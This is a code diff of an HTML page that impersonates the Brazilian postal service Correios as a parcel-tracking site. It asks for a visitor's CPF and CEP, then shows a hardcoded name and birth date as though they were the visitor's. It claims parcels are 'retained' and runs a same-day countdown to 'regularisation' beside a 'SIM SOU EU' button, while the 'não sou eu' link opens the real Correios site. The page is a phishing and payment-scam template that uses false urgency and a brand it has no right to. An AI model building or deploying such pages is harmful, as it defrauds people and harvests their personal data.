@@ -5,180 +5,263 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-  <title>Rastreamento Correios</title>
   <link rel="stylesheet" href="css/bootstrap.css" />
+  <link rel="stylesheet" href="css/app.css" />
+  <link rel="stylesheet" href="css/yellow.css" />
+  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
+  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
+  <title>Correios | Rastreio</title>
+
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f5f7fa;
-      margin: 0;
-      padding: 0;
-    }
-
-    /* Faixa amarela topo */
-    #faixa-topo {
-      background-color: #f7ca18;
-      color: #003157;
-      height: 40px;
+    /* ====== Top Bar amarela ====== */
+    #top-bar {
+      background-color: #ffd500;
+      height: 48px;
       display: flex;
-      align-items: center;
-      justify-content: flex-end;
-      padding: 0 1rem;
-      font-weight: 600;
-      font-size: 14px;
-      position: relative;
-    }
-
-    #faixa-topo .acessibilidade {
-      position: absolute;
-      left: 1rem;
-      cursor: pointer;
-      font-weight: 600;
-      user-select: none;
-    }
-
-    #faixa-topo .acessibilidade:hover {
-      text-decoration: underline;
-    }
-
-    #faixa-topo .entrar {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      cursor: pointer;
-    }
-
-    #faixa-topo .entrar img {
-      width: 18px;
-      height: 18px;
-    }
-
-    #faixa-topo .menu {
-      cursor: pointer;
-      margin-left: 1.5rem;
-      width: 25px;
-      height: 20px;
-      display: flex;
-      flex-direction: column;
       justify-content: space-between;
-    }
-
-    #faixa-topo .menu span {
-      display: block;
-      height: 3px;
-      background: #003157;
-      border-radius: 2px;
-    }
-
-    /* Logo topo */
-    #logo-topo {
-      display: block;
-      margin: 10px auto 30px auto;
-      width: 180px;
-      max-width: 90vw;
-      object-fit: contain;
-    }
-
-    /* Janela formulário */
-    #tela-formulario {
-      background-color: #c9d6df;
-      border-radius: 8px;
-      max-width: 360px;
-      width: 90%;
-      margin: 0 auto 2rem auto;
-      padding: 25px 20px 30px 20px;
-      text-align: center;
+      align-items: center;
+      padding: 0 15px;
+      font-family: Arial, sans-serif;
+      font-size: 14px;
       color: #003157;
-      font-weight: 600;
-      font-size: 16px;
-      box-shadow: 0 0 8px rgb(0 0 0 / 0.1);
-    }
-
-    #tela-formulario .frase-centralizada {
-      margin-bottom: 25px;
-      white-space: pre-line; /* para respeitar quebras de linha \n */
-      font-weight: 600;
-      font-size: 16px;
-      color: #003157;
-    }
-
-    form {
-      text-align: center;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 5px;
-      font-weight: 600;
-      text-align: center;
-    }
-
-    input[type="text"] {
-      width: 280px;
-      max-width: 90vw;
-      padding: 10px 0;
-      font-size: 16px;
-      text-align: center;
-      border: 1px solid #003157;
-      border-radius: 5px;
-      margin: 0 auto 20px auto;
-      display: block;
-      background-color: white;
       box-sizing: border-box;
     }
 
-    button#consultar-btn {
-      width: 280px;
-      max-width: 90vw;
-      background-color: #003157;
-      color: #f7ca18;
+    #top-bar .left-options a {
+      color: #003157;
+      text-decoration: none;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    #top-bar .left-options a:hover {
+      text-decoration: underline;
+    }
+
+    #top-bar .right-options {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    #btn-entrar {
+      display: flex;
+      align-items: center;
+      background: none;
       border: none;
-      padding: 12px 0;
-      border-radius: 6px;
+      cursor: pointer;
+      font-size: 14px;
+      color: #003157;
+      font-weight: 600;
+      padding: 0;
+    }
+
+    #btn-entrar img {
+      height: 20px;
+      margin-right: 6px;
+      vertical-align: middle;
+    }
+
+    #btn-entrar:hover {
+      text-decoration: underline;
+    }
+
+    #menu-hamburguer {
+      display: inline-block;
+      cursor: pointer;
+      width: 25px;
+      height: 18px;
+      position: relative;
+    }
+
+    #menu-hamburguer span {
+      background: #003157;
+      position: absolute;
+      height: 3px;
+      width: 100%;
+      border-radius: 2px;
+      opacity: 1;
+      left: 0;
+      transition: all 0.3s ease;
+    }
+
+    #menu-hamburguer span:nth-child(1) {
+      top: 0;
+    }
+
+    #menu-hamburguer span:nth-child(2) {
+      top: 7.5px;
+    }
+
+    #menu-hamburguer span:nth-child(3) {
+      top: 15px;
+    }
+
+    /* ====== Logo centralizada na horizontal e alinhada com botão consultar ====== */
+    header {
+      margin-top: 10px;
+      display: flex;
+      justify-content: center;
+      position: relative;
+    }
+
+    header img {
+      height: 40px; /* tamanho padrão, pode ajustar */
+      display: block;
+    }
+
+    main {
+      max-width: 1000px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+
+    /* Alinhamento horizontal do botão consultar e logo na mesma direção */
+    #botao-container {
+      display: flex;
+      justify-content: flex-start;
+      margin-top: 1rem;
+    }
+
+    #consultar-btn {
+      padding: 0.5rem 1.5rem;
+      font-size: 1rem;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      animation: pulsar 1s infinite;
+    }
+
+    #consultar-btn:hover {
+      background-color: #0056b3;
+    }
+
+    /* Pulsar botão */
+    @keyframes pulsar {
+      0% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.1);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    /* Formulário */
+    #tela-formulario {
+      background-color: #f0f0f0;
+      padding: 20px;
+      border-radius: 8px;
+    }
+
+    /* Campo input */
+    input.form-control {
+      max-width: 300px;
+      margin-bottom: 1rem;
+    }
+
+    /* Resultado */
+    #resultado {
+      background: #f8f9fa;
+      border-radius: 10px;
+      padding: 2rem;
+      font-family: Arial, sans-serif;
+      color: #003157;
+      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
+      text-align: center;
+    }
+
+    #resultado h2 {
       font-weight: 700;
-      font-size: 18px;
+      margin-bottom: 1rem;
+      color: #003157;
+      font-size: 14px;
+    }
+
+    #resultado p {
+      font-size: 14px;
+      margin: 0.5rem 0;
+    }
+
+    #resultado p span {
+      font-weight: 700;
+      color: #007bff;
+    }
+
+    /* Rua e Bairro vazios */
+    #res-rua,
+    #res-bairro {
+      color: transparent !important;
+      user-select: none;
+      pointer-events: none;
+    }
+
+    /* Prazo para regularização em vermelho */
+    #res-prazo {
+      font-size: 14px;
+      font-weight: 700;
+      color: red !important;
+    }
+
+    /* Botão sim sou eu */
+    #btn-sim-sou-eu {
+      margin-top: 1.5rem;
+      padding: 0.6rem 1.5rem;
+      font-size: 1.1rem;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
       transition: background-color 0.3s ease;
-      display: block;
-      margin: 0 auto;
+      display: inline-block;
     }
 
-    button#consultar-btn:hover {
-      background-color: #002244;
+    #btn-sim-sou-eu:hover {
+      background-color: #0056b3;
     }
 
-    /* Janela resultado */
-    #tela-resultado {
-      background-color: #c9d6df;
-      border-radius: 8px;
-      max-width: 360px;
-      width: 90%;
-      margin: 0 auto 2rem auto;
-      padding: 25px 20px 30px 20px;
-      text-align: left;
-      color: #003157;
-      box-shadow: 0 0 8px rgb(0 0 0 / 0.1);
-      display: none;
-      font-weight: 600;
+    /* Container para alinhar botão e link */
+    #resultado .btn-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 1.5rem;
+    }
+
+    /* Link não sou eu abaixo do botão */
+    #nao-sou-eu {
+      color: gray;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 14px;
+      display: inline-block;
+    }
+
+    #nao-sou-eu:hover {
+      color: #505050;
     }
 
     /* Spinner */
     .spinner {
-      margin: 10px auto;
-      width: 35px;
-      height: 35px;
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #003157;
+      width: 50px;
+      height: 50px;
+      border: 5px solid rgba(0, 0, 0, 0.1);
+      border-top-color: #007bff;
       border-radius: 50%;
       animation: spin 1s linear infinite;
+      margin: 20px auto;
     }
 
     @keyframes spin {
-      0% {
-        transform: rotate(0deg);
-      }
-
-      100% {
+      to {
         transform: rotate(360deg);
       }
     }
@@ -186,124 +269,213 @@
 </head>
 
 <body>
-  <!-- Faixa topo amarela -->
-  <div id="faixa-topo">
-    <div class="acessibilidade" tabindex="0" role="button" aria-label="Acessibilidade">
-      Acessibilidade
+  <!-- Faixa amarela topo -->
+  <div id="top-bar">
+    <div class="left-options">
+      <a href="#" id="acessibilidade">Acessibilidade</a>
     </div>
-    <div class="entrar" tabindex="0" role="button" aria-label="Entrar">
-      <img src="entrar.svg" alt="Ícone Entrar" />
-      Entrar
-    </div>
-    <div class="menu" tabindex="0" role="button" aria-label="Menu">
-      <span></span>
-      <span></span>
-      <span></span>
+
+    <div class="right-options">
+      <button id="btn-entrar" type="button">
+        <img src="images/entrar.svg" alt="Entrar" />
+        Entrar
+      </button>
+
+      <div id="menu-hamburguer" aria-label="Menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
     </div>
   </div>
 
-  <!-- Logo topo -->
-  <img src="logo.png" alt="Logo Bet Grand Fortune" id="logo-topo" />
+  <!-- Logo centralizada -->
+  <header>
+    <img src="images/correios.png" alt="Logo Correios" />
+  </header>
 
-  <!-- Tela formulário -->
-  <section id="tela-formulario" aria-label="Formulário de rastreamento">
-    <div class="frase-centralizada">
-      Digite o CPF do comprador.
-      <br />
-      000.000.000-00
-      <br /><br />
-      Informe o seu CEP abaixo.
-      <br />
-      00000-000
-    </div>
+  <main>
+    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000" style="margin: 0 auto;">
+      Rastreamento
+    </h1>
 
-    <form id="form-rastreamento" autocomplete="off" novalidate>
-      <label for="cpf">CPF</label>
-      <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required inputmode="numeric"
-        pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" aria-describedby="cpfHelp" />
+    <!-- Tela Formulário -->
+    <section id="tela-formulario" class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin: 0 auto;">
+      <h5 style="color: #003157;" class="text-center font-weight-700 mb-4">
+        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
+      </h5>
 
-      <label for="cep">CEP</label>
-      <input type="text" id="cep" name="cep" placeholder="00000-000" maxlength="9" required inputmode="numeric"
-        pattern="\d{5}-\d{3}" aria-describedby="cepHelp" />
+      <form id="form-rastreamento">
+        <span>Digite o CPF do comprador.</span>
+        <div class="form-group mt-1">
+          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required id="cpf" />
+        </div>
 
-      <button type="submit" id="consultar-btn">Consultar</button>
+        <span>Informe o seu CEP abaixo.</span>
+        <div class="form-group mt-1">
+          <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required />
+        </div>
 
-      <div id="loading-container" style="display: none; margin-top: 15px; text-align: center;">
-        <p style="font-weight: 600; color: #003157;">Consultando seus dados...</p>
-        <div class="spinner" role="status" aria-live="polite" aria-label="Carregando"></div>
+        <div class="form-group mt-1" id="botao-container">
+          <button type="submit" class="btn" id="consultar-btn">Consultar</button>
+        </div>
+
+        <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
+          <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
+          <div class="spinner"></div>
+        </div>
+      </form>
+    </section>
+
+    <!-- Tela Resultado -->
+    <section id="resultado" style="display: none;">
+      <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
+      <p><span>Nome:</span> <span id="res-nome"></span></p>
+      <p><span>CPF:</span> <span id="res-cpf"></span></p>
+      <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
+      <p><span>CEP:</span> <span id="res-cep"></span></p>
+      <p><span>Rua:</span> <span id="res-rua"></span></p>
+      <p><span>Bairro:</span> <span id="res-bairro"></span></p>
+      <p><span>Cidade:</span> <span id="res-cidade"></span></p>
+      <p><span>Estado:</span> <span id="res-estado"></span></p>
+      <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
+
+      <div class="btn-container">
+        <button id="btn-sim-sou-eu">SIM SOU EU</button>
+        <a href="#" id="nao-sou-eu">não sou eu</a>
       </div>
-    </form>
-  </section>
+    </section>
 
-  <!-- Tela resultado -->
-  <section id="tela-resultado" aria-live="polite" aria-label="Resultado da consulta">
-    <h2>Dados da Encomenda</h2>
-    <p><strong>CPF:</strong> <span id="resultado-cpf"></span></p>
-    <p><strong>CEP:</strong> <span id="resultado-cep"></span></p>
-    <p><strong>Status:</strong> Encomenda em trânsito</p>
-    <p><strong>Previsão de entrega:</strong> 5 dias úteis</p>
-  </section>
+    <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
+      <div>
+        <img src="images/banner-1.jpg" alt="" class="w-100" />
+      </div>
+    </section>
+  </main>
+
+  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
+    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+      <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
+      <ul>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-desktop"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+            <span class="text-wrap">Registro de Manifestações</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </footer>
 
   <script>
-    // Máscara simples para CPF
-    function maskCPF(value) {
-      return value
-        .replace(/\D/g, '')
-        .replace(/(\d{3})(\d)/, '$1.$2')
-        .replace(/(\d{3})(\d)/, '$1.$2')
-        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+    function formatarCPF(cpf) {
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
     }
 
-    // Máscara simples para CEP
-    function maskCEP(value) {
-      return value
-        .replace(/\D/g, '')
-        .replace(/(\d{5})(\d)/, '$1-$2')
-        .slice(0, 9);
+    function formatarCEP(cep) {
+      return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
     }
 
-    document.getElementById('cpf').addEventListener('input', function (e) {
-      e.target.value = maskCPF(e.target.value);
-    });
+    function atualizarContagemRegressiva() {
+      const agora = new Date();
+      const fimDoDia = new Date(
+        agora.getFullYear(),
+        agora.getMonth(),
+        agora.getDate(),
+        23,
+        59,
+        59
+      );
 
-    document.getElementById('cep').addEventListener('input', function (e) {
-      e.target.value = maskCEP(e.target.value);
-    });
+      const diffMs = fimDoDia - agora;
+      if (diffMs <= 0) {
+        document.getElementById("res-prazo").textContent = "Prazo expirado";
+        clearInterval(intervalContagem);
+        return;
+      }
 
-    const form = document.getElementById('form-rastreamento');
-    const loadingContainer = document.getElementById('loading-container');
-    const resultadoSection = document.getElementById('tela-resultado');
+      const horas = Math.floor(diffMs / (1000 * 60 * 60));
+      const minutos = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
+      const segundos = Math.floor((diffMs % (1000 * 60)) / 1000);
 
-    form.addEventListener('submit', function (e) {
+      const dd = agora.getDate().toString().padStart(2, "0");
+      const mm = (agora.getMonth() + 1).toString().padStart(2, "0");
+      const yyyy = agora.getFullYear();
+
+      document.getElementById(
+        "res-prazo"
+      ).textContent = `${dd}/${mm}/${yyyy} às 23:59 (Tempo restante: ${horas
+        .toString()
+        .padStart(2, "0")}:${minutos.toString().padStart(2, "0")}:${segundos
+        .toString()
+        .padStart(2, "0")})`;
+    }
+
+    let intervalContagem;
+
+    document
+      .getElementById("form-rastreamento")
+      .addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        const cpfInput = document.getElementById("cpf");
+        const cepInput = document.getElementById("cep");
+
+        const cpfRaw = cpfInput.value.replace(/\D/g, "");
+        const cepRaw = cepInput.value.replace(/\D/g, "");
+
+        if (!cpfRaw || cpfRaw.length !== 11) {
+          alert("Por favor, insira um CPF válido.");
+          return;
+        }
+
+        if (!cepRaw || cepRaw.length !== 8) {
+          alert("Por favor, insira um CEP válido.");
+          return;
+        }
+
+        document.getElementById("botao-container").style.display = "none";
+        document.getElementById("loading-container").style.display = "block";
+
+        await new Promise((resolve) => setTimeout(resolve, 2000));
+
+        const dadosPessoa = {
+          nome: "Rosiane Oliveira Da Silva",
+          cpf: formatarCPF(cpfRaw),
+          nascimento: "27/01/1985",
+          cep: formatarCEP(cepRaw),
+          rua: "Rua das Acácias",
+          bairro: "Centro",
+          cidade: "Porciúncula",
+          estado: "RJ",
+        };
+
+        document.getElementById("res-nome").textContent = dadosPessoa.nome;
+        document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
+        document.getElementById("res-nascimento").textContent =
+          dadosPessoa.nascimento;
+        document.getElementById("res-cep").textContent = dadosPessoa.cep;
+
+        // Deixa rua e bairro vazios
+        document.getElementById("res-rua").textContent = "";
+        document.getElementById("res-bairro").textContent = "";
+
+        document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
+        document.getElementById("res-estado").textContent = dadosPessoa.estado;
+
+        document.getElementById("loading-container").style.display = "none";
+        document.getElementById("tela-formulario").style.display = "none";
+        document.getElementById("resultado").style.display = "block";
+
+        atualizarContagemRegressiva();
+        intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
+      });
+
+    // Script para o link "não sou eu"
+    document.getElementById("nao-sou-eu").addEventListener("click", function (e) {
       e.preventDefault();
-
-      // Validação simples dos formatos
-      const cpf = form.cpf.value.trim();
-      const cep = form.cep.value.trim();
-
-      if (!cpf.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
-        alert('Por favor, insira um CPF válido no formato 000.000.000-00');
-        form.cpf.focus();
-        return;
-      }
-
-      if (!cep.match(/^\d{5}-\d{3}$/)) {
-        alert('Por favor, insira um CEP válido no formato 00000-000');
-        form.cep.focus();
-        return;
-      }
-
-      // Mostrar loading e esconder resultado
-      loadingContainer.style.display = 'block';
-      resultadoSection.style.display = 'none';
-
-      // Simular consulta (2s)
-      setTimeout(() => {
-        loadingContainer.style.display = 'none';
-        resultadoSection.style.display = 'block';
-        document.getElementById('resultado-cpf').textContent = cpf;
-        document.getElementById('resultado-cep').textContent = cep;
-      }, 2000);
+      window.open("https://www.correios.com.br/", "_blank");
+      window.close();
     });
   </script>
 </body>
